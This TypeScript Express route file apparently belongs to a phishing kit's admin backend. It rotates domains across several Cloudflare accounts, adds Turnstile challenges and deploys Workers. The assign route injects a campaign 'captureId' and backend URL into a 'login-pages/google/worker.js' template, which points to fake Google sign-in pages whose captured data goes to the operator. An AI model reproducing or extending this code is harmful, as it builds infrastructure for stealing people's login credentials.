import { Router, Request, Response } from 'express';
import prisma from '../../config/database';
import { authMiddleware } from '../../middleware/auth.middleware';
import { logger } from '../../utils/logger.util';
import { pickCloudflareAccount, updateAccountUsage, decryptToken } from '../../utils/cloudflare-rotation';
import crypto from 'crypto';

const router = Router();

// All routes require authentication (admin or technician)
router.use(authMiddleware);

/**
 * GET /api/admin/domains
 * Get all domains
 */
router.get('/', async (req: Request, res: Response) => {
  try {
    const domains = await prisma.domain.findMany({
      orderBy: { createdAt: 'desc' },
      include: {
        CloudflareAccount: {
          select: {
            name: true,
            status: true,
          },
        },
        activeCampaign: {
          select: {
            id: true,
            name: true,
            captureId: true,
          },
        },
      },
    });

    const formattedDomains = domains.map((d) => ({
      id: d.id,
      name: d.name,
      status: d.status,
      dnsStatus: d.dnsStatus,
      sslStatus: d.sslStatus,
      cloudflareZoneId: d.cloudflareZoneId,
      nameservers: d.nameservers ? JSON.parse(d.nameservers) : null,
      turnstileSitekey: d.turnstileSitekey,
      cfAccountName: d.CloudflareAccount?.name || null,
      activeCampaignId: d.activeCampaignId,
      activeCampaign: d.activeCampaign,
      createdAt: d.createdAt.toISOString(),
    }));

    res.status(200).json({
      success: true,
      domains: formattedDomains,
    });
  } catch (error: any) {
    logger.error('Get domains error:', error.message);
    res.status(200).json({
      success: true,
      domains: [],
    });
  }
});

/**
 * POST /api/admin/domains
 * Add a new domain with Cloudflare integration
 */
router.post('/', async (req: Request, res: Response) => {
  try {
    const domainName: string = (req.body.name || req.body.domain || '').trim().toLowerCase();
    if (!domainName) {
      return res.status(400).json({ error: 'Domain name is required' });
    }

    // Check for duplicate
    const existing = await prisma.domain.findFirst({ where: { name: domainName } });
    if (existing) {
      return res.status(400).json({ error: 'Domain already exists' });
    }

    // Pick best available CF account
    const cfAccount = await prisma.cloudflareAccount.findFirst({
      where: { status: 'active' },
      orderBy: [{ zonesCount: 'asc' }, { lastUsedAt: 'asc' }]
    });

    if (!cfAccount) {
      // No CF account available — save as pending
      const domain = await prisma.domain.create({
        data: {
          name: domainName,
          status: 'pending_cf',
          addedById: req.user.id
        }
      });
      return res.status(201).json({ domain, nameservers: [] });
    }

    // Decrypt API token
    const apiToken = decryptToken(cfAccount.apiToken);

    // Create CF zone
    const zoneRes = await fetch('https://api.cloudflare.com/client/v4/zones', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${apiToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        name: domainName,
        account: { id: cfAccount.accountId },
        jump_start: false
      })
    });
    const zoneData: any = await zoneRes.json();

    if (!zoneData.success) {
      // CF failed — save as pending_cf anyway, don't block the user
      const domain = await prisma.domain.create({
        data: {
          name: domainName,
          status: 'pending_cf',
          addedById: req.user.id
        }
      });
      return res.status(201).json({ domain, nameservers: [], cfError: zoneData.errors?.[0]?.message });
    }

    const zoneId: string = zoneData.result.id;
    const nameservers: string[] = zoneData.result.name_servers || [];

    // Create Turnstile widget
    let turnstileSitekey: string | null = null;
    let turnstileSecretKey: string | null = null;
    try {
      const tsRes = await fetch(
        `https://api.cloudflare.com/client/v4/accounts/${cfAccount.accountId}/challenges/widgets`,
        {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${apiToken}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ name: domainName, domains: [domainName], mode: 'managed' })
        }
      );
      const tsData: any = await tsRes.json();
      if (tsData.success) {
        turnstileSitekey = tsData.result.sitekey;
        turnstileSecretKey = tsData.result.secret;
      }
    } catch {
      // Turnstile failure is non-fatal
    }

    // Save domain with CF data
    const domain = await prisma.domain.create({
      data: {
        name: domainName,
        status: 'pending_ns',
        cloudflareZoneId: zoneId,
        nameservers: JSON.stringify(nameservers),
        turnstileSitekey,
        turnstileSecretKey,
        cloudflareAccountId: cfAccount.id,
        addedById: req.user.id
      }
    });

    // Update CF account counters
    await prisma.cloudflareAccount.update({
      where: { id: cfAccount.id },
      data: { zonesCount: { increment: 1 }, lastUsedAt: new Date() }
    });

    return res.status(201).json({ domain, nameservers, zoneId, turnstileSitekey });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

/**
 * GET /api/admin/domains/:id/status
 * Check domain status from Cloudflare
 */
router.get('/:id/status', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;

    const domain = await prisma.domain.findUnique({
      where: { id },
      include: {
        CloudflareAccount: true,
      },
    });

    if (!domain) {
      return res.status(404).json({
        success: false,
        error: 'Domain not found',
      });
    }

    if (!domain.cloudflareZoneId || !domain.CloudflareAccount) {
      return res.status(200).json({
        success: true,
        status: domain.status,
      });
    }

    // Query Cloudflare for zone status
    const apiToken = decryptToken(domain.CloudflareAccount.apiToken);

    const cfResponse = await fetch(
      `https://api.cloudflare.com/client/v4/zones/${domain.cloudflareZoneId}`,
      {
        headers: {
          'Authorization': `Bearer ${apiToken}`,
          'Content-Type': 'application/json',
        },
      }
    );

    if (!cfResponse.ok) {
      return res.status(200).json({
        success: true,
        status: domain.status,
      });
    }

    const cfData: any = await cfResponse.json();

    if (cfData.success && cfData.result) {
      const newStatus = cfData.result.status;

      // Update domain if status changed
      if (newStatus !== domain.status) {
        await prisma.domain.update({
          where: { id },
          data: { status: newStatus },
        });
      }

      return res.status(200).json({
        success: true,
        status: newStatus,
      });
    }

    res.status(200).json({
      success: true,
      status: domain.status,
    });
  } catch (error: any) {
    logger.error('Check domain status error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to check domain status',
    });
  }
});

/**
 * DELETE /api/admin/domains/:id
 * Remove a domain with Cloudflare zone cleanup
 */
router.delete('/:id', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;

    const domain = await prisma.domain.findUnique({
      where: { id },
      include: {
        CloudflareAccount: true,
      },
    });

    if (!domain) {
      return res.status(404).json({
        success: false,
        error: 'Domain not found',
      });
    }

    // If domain has CF zone, delete it from Cloudflare
    if (domain.cloudflareZoneId && domain.CloudflareAccount) {
      try {
        const apiToken = decryptToken(domain.CloudflareAccount.apiToken);

        const cfResponse = await fetch(
          `https://api.cloudflare.com/client/v4/zones/${domain.cloudflareZoneId}`,
          {
            method: 'DELETE',
            headers: {
              'Authorization': `Bearer ${apiToken}`,
              'Content-Type': 'application/json',
            },
          }
        );

        if (cfResponse.ok) {
          logger.success(`CF zone deleted: ${domain.cloudflareZoneId}`);
          
          // Decrement zone count on CF account
          await prisma.cloudflareAccount.update({
            where: { id: domain.cloudflareAccountId! },
            data: {
              zonesCount: { decrement: 1 },
            },
          });
        } else {
          const cfData: any = await cfResponse.json();
          logger.warn(`CF zone delete failed: ${cfData.errors?.[0]?.message || 'Unknown error'}`);
        }
      } catch (cfError: any) {
        logger.warn(`CF zone cleanup error: ${cfError.message}`);
        // Continue with DB delete even if CF cleanup fails
      }
    }

    // Delete domain from database
    await prisma.domain.delete({
      where: { id },
    });

    logger.info(`Domain deleted: ${domain.name}`);

    res.status(200).json({
      success: true,
      message: 'Domain deleted successfully',
    });
  } catch (error: any) {
    logger.error('Delete domain error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to delete domain',
    });
  }
});

/**
 * POST /api/admin/domains/:id/check
 * Check domain status from Cloudflare
 */
router.post('/:id/check', async (req: Request, res: Response) => {
  try {
    const domain = await prisma.domain.findUnique({
      where: { id: req.params.id },
      include: { CloudflareAccount: true }
    });
    
    if (!domain) {
      return res.status(404).json({ error: 'Domain not found' });
    }

    if (!domain.cloudflareZoneId || !domain.CloudflareAccount) {
      return res.json({ 
        status: domain.status, 
        message: 'No Cloudflare zone linked to this domain' 
      });
    }

    const apiToken = decryptToken(domain.CloudflareAccount.apiToken);

    const cfRes = await fetch(
      `https://api.cloudflare.com/client/v4/zones/${domain.cloudflareZoneId}`,
      { headers: { Authorization: `Bearer ${apiToken}` } }
    );
    const cfData: any = await cfRes.json();

    if (!cfData.success) {
      return res.status(400).json({ 
        error: cfData.errors?.[0]?.message || 'Cloudflare check failed' 
      });
    }

    const cfStatus: string = cfData.result.status;
    const newStatus = cfStatus === 'active' ? 'active' : 'pending_ns';

    await prisma.domain.update({
      where: { id: req.params.id },
      data: { status: newStatus }
    });

    logger.success(`Domain ${domain.name} status checked: ${newStatus}`);

    return res.json({
      status: newStatus,
      cfStatus,
      message: cfStatus === 'active'
        ? 'Nameservers verified. Domain is now active.'
        : 'Nameservers not yet detected. Check your registrar settings and try again later.'
    });
  } catch (err: any) {
    logger.error('Check domain status error:', err.message);
    return res.status(500).json({ error: err.message });
  }
});

/**
 * POST /api/admin/domains/:id/repair
 * Deploy or redeploy Worker for a domain to update BACKEND_URL and configuration
 * Can be used for both new deployments and updating existing Workers
 */
router.post('/:id/repair', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;

    const domain = await prisma.domain.findUnique({
      where: { id },
      include: { CloudflareAccount: true },
    });

    if (!domain) {
      return res.status(404).json({
        success: false,
        error: 'Domain not found',
      });
    }

    if (!domain.cloudflareZoneId || !domain.CloudflareAccount) {
      return res.status(400).json({
        success: false,
        error: 'Domain must have Cloudflare zone configured',
      });
    }

    // Always redeploy to update BACKEND_URL and configuration
    logger.info(`${domain.cfWorkerName ? 'Updating' : 'Deploying'} Workers Page for domain ${domain.name}...`);

    const { DeploymentService } = await import('../../services/deployment.service');
    const deploymentService = new DeploymentService();

    const { cfWorkerName, cfRootCustomDomainId } = await deploymentService.deployWorkerForDomain(id);

    logger.success(`Domain ${domain.cfWorkerName ? 'updated' : 'repaired'}: ${domain.name} → ${cfWorkerName}`);

    return res.status(200).json({
      success: true,
      message: domain.cfWorkerName ? 'Worker updated successfully' : 'Worker deployed successfully',
      workerName: cfWorkerName,
      customDomainId: cfRootCustomDomainId,
    });
  } catch (error: any) {
    logger.error('Repair domain error:', error.message);
    return res.status(500).json({
      success: false,
      error: error.message || 'Failed to repair domain',
    });
  }
});

/**
 * PATCH /api/admin/domains/:id/assign
 * Assign or unassign a campaign from a domain
 * FIX C: Redeploys Worker when campaign is assigned
 */
router.patch('/:id/assign', async (req: Request, res: Response) => {
  try {
    const { campaignId } = req.body;
    const domainId = req.params.id;

    // Update domain with new campaign assignment
    const domain = await prisma.domain.update({
      where: { id: domainId },
      data: { activeCampaignId: campaignId || null },
      include: { CloudflareAccount: true },
    });

    // FIX C: Redeploy Worker if domain has Worker deployed and campaign is being assigned
    if (campaignId && domain.cfWorkerName && domain.cloudflareZoneId && domain.CloudflareAccount) {
      logger.info(`Campaign assigned to ${domain.name} - redeploying Worker with updated configuration...`);

      try {
        const fs = await import('fs');
        const path = await import('path');
        const { createCloudflareClient } = await import('../../services/cloudflare/cloudflare-client');

        // Read worker template
        const workerPath = path.resolve(__dirname, '../../login-pages/google/worker.js');
        const workerTemplate = fs.readFileSync(workerPath, 'utf-8');

        // Fetch campaign captureId for injection
        const assignedCampaign = campaignId
          ? await prisma.campaign.findUnique({
              where: { id: campaignId },
              select: { captureId: true },
            })
          : null;
        const captureId = assignedCampaign?.captureId || '';
        const backendUrl = process.env.BACKEND_URL || 'http://localhost:8000';
        const workerScript = workerTemplate
          .replace(/__BACKEND_URL__/g, backendUrl)
          .replace(/\{\{CAPTURE_ID\}\}/g, captureId);
        logger.info(`[ASSIGN] CAPTURE_ID="${captureId}" injected for ${domain.name}`);

        // Redeploy Worker script
        const cfClient = createCloudflareClient(
          domain.CloudflareAccount.apiToken,
          domain.CloudflareAccount.accountId
        );

        await cfClient.deployWorkerScript(
          domain.CloudflareAccount.accountId,
          workerScript,
          domain.cfWorkerName
        );

        logger.success(`Worker redeployed for ${domain.name} with campaign ${campaignId}`);
      } catch (redeployError: any) {
        logger.warn('Worker redeploy failed (non-fatal):', redeployError.message);
      }
    }

    return res.json({ 
      success: true,
      domain: {
        id: domain.id,
        name: domain.name,
        activeCampaignId: domain.activeCampaignId,
        cfWorkerName: domain.cfWorkerName,
      },
    });
  } catch (err: any) {
    return res.status(500).json({ 
      success: false,
      error: err.message 
    });
  }
});

/**
 * GET /api/admin/domains/:id/subdomains
 * Get all subdomains for a domain
 */
router.get('/:id/subdomains', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;

    const subdomains = await prisma.subdomain.findMany({
      where: { domainId: id },
      orderBy: { createdAt: 'desc' },
    });

    res.status(200).json({
      success: true,
      subdomains: subdomains.map(sub => ({
        id: sub.id,
        subdomain: sub.subdomain,
        status: sub.status,
        createdAt: sub.createdAt.toISOString(),
      })),
    });
  } catch (error: any) {
    logger.error('Get subdomains error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to get subdomains',
    });
  }
});

/**
 * POST /api/admin/domains/:id/subdomains
 * Add subdomain using Custom Domains API
 * Auto-deploys parent domain Worker if not yet deployed
 */
router.post('/:id/subdomains', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { subdomain } = req.body;

    if (!subdomain) {
      return res.status(400).json({
        success: false,
        error: 'Subdomain is required',
      });
    }

    // Get parent domain
    let domain = await prisma.domain.findUnique({
      where: { id },
      include: {
        subdomains: true,
        CloudflareAccount: true,
      },
    });

    if (!domain) {
      return res.status(404).json({
        success: false,
        error: 'Domain not found',
      });
    }

    // Check subdomain limit (max 7)
    if (domain.subdomains.length >= 7) {
      return res.status(400).json({
        success: false,
        error: 'Maximum 7 subdomains allowed per domain',
      });
    }

    // Check if subdomain already exists
    const existingSubdomain = domain.subdomains.find(
      (s) => s.subdomain === subdomain
    );

    if (existingSubdomain) {
      return res.status(400).json({
        success: false,
        error: 'Subdomain already exists',
      });
    }

    // Verify parent domain has zone and CF account
    if (!domain.cloudflareZoneId || !domain.CloudflareAccount) {
      return res.status(400).json({
        success: false,
        error: 'Domain must have Cloudflare zone configured',
      });
    }

    // FIX A: Auto-deploy Worker for parent domain if not yet deployed
    if (!domain.cfWorkerName) {
      logger.info(`Parent domain ${domain.name} has no Worker deployed. Auto-deploying now...`);
      const { DeploymentService } = await import('../../services/deployment.service');
      const deploymentService = new DeploymentService();
      
      try {
        await deploymentService.deployWorkerForDomain(id);
        
        // Reload domain to get updated cfWorkerName
        const reloadedDomain = await prisma.domain.findUnique({
          where: { id },
          include: {
            subdomains: true,
            CloudflareAccount: true,
          },
        });
        
        if (!reloadedDomain || !reloadedDomain.cfWorkerName) {
          throw new Error('Failed to retrieve deployed Worker information');
        }
        
        domain = reloadedDomain;
        logger.success(`Parent domain Worker deployed: ${domain.cfWorkerName}`);
      } catch (deployError: any) {
        logger.error('Failed to auto-deploy parent domain Worker:', deployError.message);
        return res.status(500).json({
          success: false,
          error: `Failed to deploy Worker for parent domain: ${deployError.message}`,
        });
      }
    }

    // At this point, domain must have cfWorkerName and CloudflareAccount
    if (!domain.cfWorkerName || !domain.CloudflareAccount) {
      return res.status(500).json({
        success: false,
        error: 'Domain Worker deployment verification failed',
      });
    }

    const fullSubdomainHostname = `${subdomain}.${domain.name}`;
    const apiToken = decryptToken(domain.CloudflareAccount.apiToken);
    const cfClient = await import('../../services/cloudflare/cloudflare-client').then(m => 
      m.createCloudflareClient(apiToken, domain.CloudflareAccount!.accountId)
    );

    // Subdomains inherit parent domain's Turnstile configuration
    logger.info(`Subdomain will use parent domain's Turnstile keys: ${domain.turnstileSitekey || 'none'}`);

    // Step 1: Attach subdomain as Custom Domain to the same worker
    // Note: attachWorkerDomain automatically creates the necessary DNS routing
    logger.info(`Attaching subdomain as Custom Domain: ${fullSubdomainHostname}`);
    const { id: cfCustomDomainId } = await cfClient.attachWorkerDomain({
      accountId: domain.CloudflareAccount.accountId,
      workerName: domain.cfWorkerName,
      hostname: fullSubdomainHostname,
      zoneId: domain.cloudflareZoneId!,
      zoneName: domain.name,
    });

    logger.success(`Custom Domain attached: ${fullSubdomainHostname} (Cloudflare handles DNS automatically)`);

    // Step 3: Save subdomain to database with Turnstile keys and cfCustomDomainId
    const newSubdomain = await prisma.subdomain.create({
      data: {
        domainId: id,
        subdomain,
        cfCustomDomainId,
        status: 'ACTIVE',
      },
    });

    logger.success(`Subdomain created: ${fullSubdomainHostname} (${newSubdomain.id})`);

    res.status(201).json({
      success: true,
      subdomain: {
        id: newSubdomain.id,
        subdomain: newSubdomain.subdomain,
        fullDomain: fullSubdomainHostname,
        status: newSubdomain.status,
        turnstileSitekey: domain.turnstileSitekey, // Inherits from parent domain
        createdAt: newSubdomain.createdAt.toISOString(),
      },
    });
  } catch (error: any) {
    logger.error('Create subdomain error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to create subdomain',
    });
  }
});

/**
 * DELETE /api/admin/domains/:id/subdomains/:subId
 * Delete subdomain - detach Custom Domain and delete DNS record
 */
router.delete('/:id/subdomains/:subId', async (req: Request, res: Response) => {
  try {
    const { id, subId } = req.params;

    // Get subdomain
    const subdomain = await prisma.subdomain.findUnique({
      where: { id: subId },
      include: {
        domain: {
          include: {
            CloudflareAccount: true,
          },
        },
      },
    });

    if (!subdomain || subdomain.domainId !== id) {
      return res.status(404).json({
        success: false,
        error: 'Subdomain not found',
      });
    }

    // Cleanup Cloudflare resources
    if (subdomain.cfCustomDomainId && subdomain.domain.CloudflareAccount) {
      try {
        const apiToken = decryptToken(subdomain.domain.CloudflareAccount.apiToken);
        const cfClient = await import('../../services/cloudflare/cloudflare-client').then(m => 
          m.createCloudflareClient(apiToken, subdomain.domain.CloudflareAccount!.accountId)
        );

        // Step 1: Detach Custom Domain
        if (subdomain.cfCustomDomainId) {
          logger.info(`Detaching Custom Domain: ${subdomain.cfCustomDomainId}`);
          await cfClient.detachWorkerDomain({
            accountId: subdomain.domain.CloudflareAccount.accountId,
            domainId: subdomain.cfCustomDomainId,
          });
        }

        // Step 2: Delete DNS record (find by name)
        if (subdomain.domain.cloudflareZoneId) {
          logger.info(`Deleting DNS record for: ${subdomain.subdomain}`);
          const dnsRecords = await cfClient.listDnsRecords(subdomain.domain.cloudflareZoneId);
          const fullHostname = `${subdomain.subdomain}.${subdomain.domain.name}`;
          const record = dnsRecords.result.find((r: any) => r.name === fullHostname);
          
          if (record) {
            await cfClient.deleteDnsRecord(subdomain.domain.cloudflareZoneId, record.id);
          }
        }
      } catch (error) {
        logger.warn(`Failed to cleanup Cloudflare resources for subdomain ${subId}:`, error);
        // Continue with database deletion even if CF cleanup fails
      }
    }

    // Step 3: Delete from database
    await prisma.subdomain.delete({
      where: { id: subId },
    });

    logger.info(`Subdomain deleted: ${subdomain.subdomain} (${subId})`);

    res.status(200).json({
      success: true,
      message: 'Subdomain deleted successfully',
    });
  } catch (error: any) {
    logger.error('Delete subdomain error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to delete subdomain',
    });
  }
});

export default router;
